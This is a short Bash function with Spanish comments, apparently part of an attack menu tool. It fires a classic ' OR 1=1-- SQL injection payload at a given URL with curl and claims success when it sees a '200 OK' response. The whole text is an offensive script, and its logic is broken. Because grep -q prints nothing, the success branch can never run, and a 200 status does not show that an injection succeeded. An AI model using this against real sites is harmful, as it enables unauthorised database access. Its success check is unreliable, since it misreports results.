sqli() {
#preparamos las variables
URL=$(echo "$url")
SQLi="%27+OR+1=1--"
ATTACK=$URL$SQLi
#si el ataque funciona
bellota=$(curl -s -i "$ATTACK" | grep -q "200 OK")
echo $bellota
if [ -n "$bellota" ]
then
#muestrame por pantalla una url con el resultado
  echo "Haz clic en el siguiente enlace para ver el resultado del ataque: $ATTACK"
else
#si no funciona muestra este mensaje de error y cierra el programa
  echo "Disculpa, el ataque no ha funcionado."
  'volvermenu'
fi
}
